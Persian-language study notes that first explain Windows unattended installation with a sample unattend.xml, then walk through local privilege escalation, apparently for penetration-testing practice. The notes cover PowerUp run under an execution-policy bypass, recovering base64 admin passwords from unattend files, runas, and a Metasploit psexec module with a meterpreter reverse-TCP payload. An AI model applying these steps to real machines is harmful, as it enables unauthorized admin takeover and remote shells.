


🔹 **Unattended Windows Installation** یعنی **نصب ویندوز به‌صورت خودکار بدون دخالت کاربر**.

به طور معمول وقتی ویندوز نصب می‌کنی، در حین نصب باید چند تا چیز رو دستی وارد کنی، مثل:

- انتخاب زبان و کیبورد
    
- نام کاربر و پسورد
    
- شماره سریال (Product Key)
    
- نوع پارتیشن و درایو نصب
    
- تنظیمات شبکه و Domain/Workgroup
    

اما در **Unattended Installation** همه‌ی این اطلاعات از قبل توی یک فایل (معمولاً `unattend.xml`) یا اسکریپت ذخیره میشه. بعد موقع نصب ویندوز، سیستم به طور خودکار اون اطلاعات رو می‌خونه و نصب کامل رو بدون اینکه چیزی از کاربر بپرسه انجام میده.

🔧 کاربردها:

1. **صرفه‌جویی در زمان** → برای وقتی که می‌خوای روی چندین کامپیوتر (مثلاً توی یک سازمان) ویندوز نصب کنی.
    
2. **استانداردسازی** → همه سیستم‌ها دقیقاً با تنظیمات یکسان نصب میشن.
    
3. **اتوماسیون** → میشه با ابزارهایی مثل MDT، WDS، SCCM یا حتی Sysprep این کار رو مدیریت کرد.
    

📌 مثال:  
فرض کن توی یک شرکت ۵۰ تا سیستم جدید داری. به جای اینکه تک‌تک بشینی و همه سوال‌های نصب ویندوز رو جواب بدی، یک فایل `unattend.xml` می‌سازی. بعد کافیه ویندوز رو بوت کنی و اون فایل رو بدی بهش؛ نصب خودش تا آخر میره جلو و وقتی تموم شد، همه سیستم‌ها آماده‌ به کار هستن.

---

---

### 📍 مسیر فایل `unattend.xml`
این فایل معمولاً در چند جای مختلف می‌تونه باشه، ولی **ویندوز هنگام نصب دنبال اولویت‌های خاصی می‌گرده**:  

1. **روی USB یا DVD نصب**  
   - مسیر:  
     ```
     \Sources\unattend.xml
     ```
   - وقتی ویندوز از روی این مدیا نصب میشه، اول دنبال این فایل توی پوشه `Sources` می‌گرده.  

2. **توی خود ویندوز (قبل یا بعد از نصب)**  
   - مسیرهای رایج:  
     ```
     C:\Windows\System32\Sysprep\unattend.xml
     C:\Windows\Panther\unattend.xml
     C:\Windows\Panther\Unattend\unattend.xml
     ```
   - `Panther` پوشه‌ایه که ویندوز برای لاگ‌ها و فایل‌های نصب استفاده می‌کنه.  

---

### 🔑 نکته‌ی یکتا بودن
- همون‌طور که گفتی، **Username و Password می‌تونه برای همه سیستم‌ها یکی باشه**.  
- **اما اسم کامپیوتر (ComputerName)** باید یکتا باشه، مخصوصاً اگه قراره توی **Domain** جوین بشه.  
- معمولاً توی `unattend.xml` میشه برای ComputerName از متغیرهایی مثل `*` استفاده کرد تا ویندوز خودش یه اسم رندوم بسازه.  

---

### 👤 درباره پسوردها
- میشه یه پسورد پیش‌فرض برای Administrator همه‌ی سیستم‌ها گذاشت.  
- بعدش با Group Policy یا اسکریپت لاگین (Logon Script) می‌تونی **کاربر رو مجبور کنی پسوردشو بعد از اولین ورود تغییر بده**.  
  - این کار با گزینه‌ی **User must change password at next logon** توی Active Directory یا حتی Local User امکان‌پذیره.  

---

📌 پس به طور خلاصه:  
- مسیر اصلی: `\Sources\unattend.xml` روی مدیای نصب.  
- پسورد می‌تونه یکی باشه، اما توصیه امنیتی → کاربر بعد از اولین لاگین مجبور بشه تغییر بده.  
- چیز منحصر به‌فرد مهم: **ComputerName** (به‌ویژه در شبکه‌های Domain).  

---


---

### ۱. ساخت فلش بوتیبل ویندوز

- اول ISO ویندوز رو با ابزاری مثل **Rufus** یا **Ventoy** روی فلش بوتیبل کن.
    
- بعد از این مرحله، فلشت دقیقاً مثل DVD نصب ویندوز کار می‌کنه.
    

---

### ۲. آماده‌سازی فایل `unattend.xml`

- باید با ابزار **Windows System Image Manager (WSIM)** (که داخل Windows ADK هست) فایل `unattend.xml` رو بسازی.
    
- داخل این فایل مشخص می‌کنی: زبان، لایسنس، یوزر/پسورد، نام کامپیوتر، شبکه و …
    

مثال ساده:

```xml
<ComputerName>*</ComputerName>
<Username>Admin</Username>
<Password>MyStrongPass123</Password>
```

_(علامت `*` یعنی خود ویندوز اسم رندوم برای کامپیوتر بسازه.)_

---

### ۳. قرار دادن `unattend.xml` در فلش

اینجا مهمه 👇

- فلشت رو باز کن.
    
- برو داخل پوشه‌ی:
    
    ```
    \Sources\
    ```
    
- فایل ساخته‌شده `unattend.xml` رو کپی کن همونجا.
    

📌 وقتی سیستم از فلش بوت بشه، **Windows Setup** میاد دنبال همین فایل داخل پوشه `\Sources` و اگه پیدا کنه، نصب رو بدون هیچ سؤال اضافه ادامه میده.

---

### ۴. بوت و نصب خودکار

- سیستم خام رو روشن کن.
    
- از BIOS/UEFI انتخاب کن که از فلش بوت کنه.
    
- ویندوز شروع به نصب می‌کنه و به خاطر وجود فایل `unattend.xml` هیچ‌چیزی ازت نمی‌پرسه (یا خیلی محدود می‌پرسه بسته به اینکه چه چیزهایی تو فایل پر شده باشه).
    

---

### 🔑 نکته‌ها

- اگه میخوای نصب **کاملاً خودکار باشه** باید همه جزئیات رو داخل `unattend.xml` پر کنی.
    
- اگه بخشی رو خالی بذاری (مثلاً نام کامپیوتر) فقط همون رو ازت می‌پرسه.
    
- برای شبکه‌های بزرگ معمولاً از WDS/MDT استفاده میشه (ویندوز رو از شبکه Deploy می‌کنن) ولی برای یک سیستم یا تعداد کم، همین فلش بهترین راهه.
    

---


---

### 📝 نمونه فایل `unattend.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="windowsPE">
        <!-- انتخاب زبان، کیبورد و منطقه -->
        <component name="Microsoft-Windows-International-Core-WinPE" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
            <SetupUILanguage>
                <UILanguage>en-US</UILanguage>
            </SetupUILanguage>
            <InputLocale>en-US</InputLocale>
            <SystemLocale>en-US</SystemLocale>
            <UILanguage>en-US</UILanguage>
            <UserLocale>en-US</UserLocale>
        </component>

        <!-- انتخاب دیسک و نصب روی پارتیشن اول -->
        <component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
            <DiskConfiguration>
                <Disk wcm:action="add">
                    <DiskID>0</DiskID>
                    <WillWipeDisk>true</WillWipeDisk>
                    <CreatePartitions>
                        <CreatePartition wcm:action="add">
                            <Order>1</Order>
                            <Type>Primary</Type>
                            <Size>100000</Size>
                        </CreatePartition>
                    </CreatePartitions>
                </Disk>
            </DiskConfiguration>
            <ImageInstall>
                <OSImage>
                    <InstallFrom>
                        <MetaData wcm:action="add">
                            <Key>/IMAGE/INDEX</Key>
                            <Value>1</Value>
                        </MetaData>
                    </InstallFrom>
                    <InstallTo>
                        <DiskID>0</DiskID>
                        <PartitionID>1</PartitionID>
                    </InstallTo>
                </OSImage>
            </ImageInstall>
        </component>
    </settings>

    <settings pass="specialize">
        <!-- نام کامپیوتر (اتوماتیک) -->
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
            <ComputerName>*</ComputerName>
        </component>
    </settings>

    <settings pass="oobeSystem">
        <!-- فعال کردن حساب Administrator با پسورد -->
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
            <UserAccounts>
                <AdministratorPassword>
                    <Value>MyStrongPass123</Value>
                    <PlainText>true</PlainText>
                </AdministratorPassword>
            </UserAccounts>
            
            <!-- تنظیمات تجربه اول بوت -->
            <OOBE>
                <HideEULAPage>true</HideEULAPage>
                <HideOEMRegistrationScreen>true</HideOEMRegistrationScreen>
                <HideOnlineAccountScreens>true</HideOnlineAccountScreens>
                <ProtectYourPC>3</ProtectYourPC>
            </OOBE>
            <RegisteredOwner>Martin</RegisteredOwner>
            <RegisteredOrganization>TestLab</RegisteredOrganization>
            <TimeZone>UTC</TimeZone>
        </component>
    </settings>
</unattend>
```

---

### 🔍 توضیح مرحله‌به‌مرحله

1. **بخش windowsPE**
    
    - اینجا زبان نصب و کیبورد مشخص میشه.
        
    - همچنین تنظیمات دیسک → مشخص کردیم کل دیسک 0 پاک بشه (`WillWipeDisk=true`) و یه پارتیشن 100GB ساخته بشه.
        
    - `ImageInstall` میگه ویندوز از کدوم ایمیج داخل ISO نصب بشه (`INDEX=1` یعنی اولین نسخه موجود).
        
2. **بخش specialize**
    
    - اینجا اسم کامپیوتر تنظیم میشه.
        
    - مقدار `*` یعنی ویندوز خودش یه اسم رندوم بزنه.
        
3. **بخش oobeSystem**
    
    - اکانت Administrator فعال میشه با پسورد `MyStrongPass123`.
        
    - صفحات اولیه نصب (EULA, Online Account, …) مخفی میشن تا کاربر چیزی نبینه.
        
    - تایم‌زون روی UTC گذاشته شده.
        

---

### 📌 نتیجه

- وقتی این فایل رو بذاری توی فلش، داخل مسیر:
    
    ```
    \Sources\unattend.xml
    ```
    
- سیستم خام رو بوت کنی →  
    ویندوز بدون هیچ سؤال اضافه، خودش نصب میشه روی دیسک صفر، اکانت Admin با پسورد آماده میشه و مستقیم وارد دسکتاپ میشی.
    

---


---

### 🛠 ابزار ساخت خودکار `unattend.xml`

اسمش هست:  
**Windows System Image Manager (WSIM)**  
این ابزار داخل **Windows ADK (Assessment and Deployment Kit)** قرار داره.

---

### ✅ روش کار به زبان ساده:

1. **دانلود و نصب Windows ADK**
    
    - ورژن مربوط به ویندوزی که می‌خوای نصب کنی رو دانلود کن (مثلاً برای Windows 10 یا 11).
        
    - نصب کن و حتماً گزینه‌ی _Deployment Tools_ رو انتخاب کن.
        
2. **اجرای Windows SIM (WSIM)**
    
    - برنامه رو باز می‌کنی.
        
    - فایل ISO ویندوز رو Mount می‌کنی.
        
    - فایل `install.wim` (داخل پوشه `sources` در ISO) رو به WSIM معرفی می‌کنی.
        
    - اینطوری WSIM می‌فهمه قراره کدوم ویندوز نصب بشه.
        
3. **ساخت Answer File (همون unattend.xml)**
    
    - از بخش **Answer File** مرحله‌ها رو یکی‌یکی انتخاب می‌کنی (windowsPE, specialize, oobeSystem).
        
    - هر گزینه‌ای رو فقط با کلیک و وارد کردن مقدار تنظیم می‌کنی (مثل زبان، پارتیشن، پسورد).
        
    - در نهایت برنامه خودش یک فایل `unattend.xml` مرتب و معتبر می‌سازه.
        
4. **ذخیره کردن فایل**
    
    - فایل رو با اسم `unattend.xml` ذخیره می‌کنی.
        
    - کپی می‌کنی داخل فلش مسیر:
        
        ```
        \Sources\unattend.xml
        ```
        

---

### 📌 نکته:

- لازم نیست همه گزینه‌ها رو پر کنی.
    
- می‌تونی فقط زبان + پسورد + اسم یوزر رو ست کنی و بقیه چیزها مثل پارتیشن‌بندی رو دستی انجام بدی.
    
- هرچی بیشتر پر کنی، نصب خودکارتر میشه.
    

---

---

### 📌 دستور `whoami /priv`

این دستور در **ویندوز** استفاده میشه و نشون میده:

- کاربر فعلی که لاگین کرده (همون `whoami`)
    
- چه **Privilege**‌هایی (سطح دسترسی ویژه‌ای) روی سیستم داره.
    

---

### 🔍 خروجی دستور

وقتی بزنی:

```powershell
whoami /priv
```

یه لیست بهت میده شامل:

- **Privilege Name** → اسم سطح دسترسی (مثلاً `SeDebugPrivilege`, `SeShutdownPrivilege`, …)
    
- **Description** → توضیح کوتاه از اون سطح دسترسی (مثلاً Debug programs, Shut down the system)
    
- **State** → میگه فعلاً `Enabled` یا `Disabled` هست.
    

---

### 📖 چند مثال از Privilege‌ های مهم

- **SeDebugPrivilege** → اجازه دیباگ کردن پروسس‌ها (خیلی حساسه، معمولاً فقط Admin داره).
    
- **SeBackupPrivilege** → اجازه گرفتن بکاپ از فایل‌ها (حتی اگر ACL اجازه دسترسی نده).
    
- **SeShutdownPrivilege** → اجازه خاموش/ری‌استارت کردن سیستم.
    
- **SeTakeOwnershipPrivilege** → اجازه گرفتن مالکیت فایل‌ها یا آبجکت‌ها.
    
- **SeChangeNotifyPrivilege** → مربوط به Bypass Traverse Checking (تقریباً همه کاربرا دارن).
    

---

### ⚔️ کاربرد در امنیت و هک (Privilege Escalation)

وقتی داری تست نفوذ یا تحلیل امنیتی می‌کنی، با `whoami /priv` متوجه میشی:

- آیا یوزر فعلی دسترسی‌های خاصی داره که بشه **Privilege Escalation** انجام داد یا نه.
    
- مثلاً اگه `SeImpersonatePrivilege` یا `SeAssignPrimaryTokenPrivilege` فعال باشه → میشه با تکنیک‌هایی مثل **Juicy Potato / PrintSpoofer** دسترسی SYSTEM گرفت.
    

---

📌 خلاصه:  
`whoami /priv` یکی از مهم‌ترین دستورات برای فهمیدن **سطح واقعی دسترسی** کاربر تو ویندوزه.

---

commands


```
powershell -ep bypass 
```

import PowerUp Module
```
. .\PowerUp.ps1
```

```
invoke-privescAudit
```



---

## 📌 `Invoke-PrivEscAudit` چیه و چه‌کار می‌کنه؟

این کامند در واقع یک **ماژول جامع برای بررسی سطح دسترسی‌ها و تنظیمات اشتباه روی ویندوز**ه.  
وقتی اجراش می‌کنی، کل سیستم رو اسکن می‌کنه و نقاطی که ممکنه بشه ازشون برای **Privilege Escalation** استفاده کرد رو لیست می‌کنه.  

---

## 🔍 کارهایی که انجام میده (چند نمونه مهم)
`Invoke-PrivEscAudit` ترکیبی از چندین تست مختلفه، مثل:  

1. **بررسی Service Misconfigurations**  
   - سرویس‌هایی که یوزر معمولی بتونه تغییرشون بده (`binPath`, `ImagePath`)  
   - سرویس‌هایی که روی حساب LocalSystem اجرا میشن و قابل سوءاستفاده هستن.  

2. **بررسی DLL Hijacking**  
   - سرویس‌ها یا برنامه‌هایی که DLLهاشون از مسیر قابل‌نوشتن یوزر لود میشه.  

3. **بررسی Registry Permissions**  
   - کلیدهای رجیستری با دسترسی ضعیف (که یوزر معمولی بتونه تغییر بده).  

4. **بررسی Scheduled Tasks**  
   - تسک‌هایی که با دسترسی بالا اجرا میشن ولی یوزر معمولی بتونه تغییرشون بده.  

5. **بررسی Unquoted Service Paths**  
   - سرویس‌هایی که مسیرشون کوتیشن نداره → میشه جایگزین برنامه کرد و با دسترسی بالا اجراش کرد.  

6. **بررسی Token Privileges**
   - چک می‌کنه یوزر فعلی چه Privilegeهایی داره (`SeImpersonatePrivilege`, `SeDebugPrivilege` و …) که بشه باهاشون اکسپلویت کرد.  

7. **بررسی Passwords in Registry/Files**  
   - پسوردهایی که به‌صورت Cleartext یا قابل بازیابی داخل رجیستری، فایل‌ها یا GPP ذخیره شدن.  

---

## 🎯 خلاصه
`Invoke-PrivEscAudit` = **چک‌لیست خودکار برای پیدا کردن راه‌های لوکال Privilege Escalation در ویندوز**.  
بعد از اجرا، بهت نشون میده:  
- کجا دسترسی‌های ضعیف هست  
- چه سرویس‌هایی قابل سوءاستفاده‌ن  
- کجا پسورد ذخیره شده  
- چه Privilegeهایی داری  

و تو می‌تونی با توجه به خروجی، مسیر حمله‌ت رو انتخاب کنی.  

---

📌 معمولاً مهاجم‌ها بعد از اجرای این دستور، میرن سراغ فانکشن‌های دیگه PowerUp مثل:  
- `Invoke-ServiceAbuse`  
- `Invoke-CheckLocalAdminAccess`  
- `Get-ServiceUnquoted`  

---

result

![[Pasted image 20250818214636.png]]


![[Pasted image 20250818214738.png]]


نکته یی که وجود دارد این است که اکثر مواقع پسورد به شکل bas64 ذخیره میشود 
که ما میتونیم از طریق این کامند بیایم و متن رو به شکل طبیعی ببینیم

![[Pasted image 20250818214920.png]]

next :

```
runas.exe /user:Administreator cmd  
```

حالا با استفاده از ابزار runas که برای اجرای برنامه های مختلف با سطح دسترسی کاربران دیگر انجام میشود میتوانیم حالا که پسورد user مد نظر داریم بیایم و با این ابزار  روی این user به cmd دسترسی بگیریم


```
msfconsole

use exploit/windows/smb/psexec

set SMBPass Admin@123
set SMBUser Administrator
set rhost x.x.x.x
set payload windows/meterpreter/reverce_tcp

exploit

```


حالا که دسترسی ادمین داریم میتونیم با استفاده از ابزار psexec و یک payload meterpreter بیایم و دسترسی خودمون رو با meterpreter افزایش بدیم و فرایند post exploitation رو پیش ببریم
